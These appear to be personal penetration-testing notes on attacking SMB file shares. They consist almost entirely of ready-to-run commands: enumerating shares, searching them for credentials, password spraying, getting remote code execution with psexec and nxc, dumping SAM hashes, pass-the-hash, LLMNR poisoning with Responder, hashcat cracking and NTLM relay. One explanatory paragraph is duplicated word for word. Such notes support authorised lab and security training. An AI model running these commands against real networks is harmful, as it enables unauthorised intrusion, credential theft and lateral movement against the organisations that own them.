## share listing

```sh
dir \\192.168.220.129\Finance\
```


```sh
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

## Counting files in the share

```sh
dir n: /a-d /s /b | find /c ":\"
```

## Searching in specific

- specific file name 

```sh
dir n:\*cred* /s /b
```

- search for a specific word within a text file

```sh
findstr /s /i cred n:\*.*
```

## Enumeration

```sh
sudo nmap 10.129.14.128 -sV -sC -p139,445 --script "*smb*"
```

## Misconfigurations

#### Anonymous Authentication

```sh
smbclient -N -L //10.129.14.128
```

```sh
smbmap -H 10.129.14.128
```

- recursive one 

```sh
smbmap -H 10.129.14.128 -r notes
```

- to download a file 

```sh
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

- To upload a file

```sh
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call (RPC)

- We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller

```sh
rpcclient -U'%' 10.10.110.17
```

- with enum4linux 

```sh
enum4linux-ng 10.10.11.45 -A -C
```

## Protocol Specifics Attacks

#### Brute Forcing and Password Spray

```sh
nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' 
```

#### Remote Code Execution (RCE)

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

- To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine

```sh
impacket-psexec administrator:'Password123!'@10.10.110.17
```

### NXC

```sh
nxc smb 127.0.0.1 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### Enumerating Logged-on Users

```sh
nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --users
```

#### Extract Hashes from SAM Database

```sh
nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH)

```sh
 nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### Forced Authentication Attacks

- Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

```sh
sudo responder -I ens33
```

- we can crack the hash 

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

- we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) , First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```sh
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 -c "whoami"
```



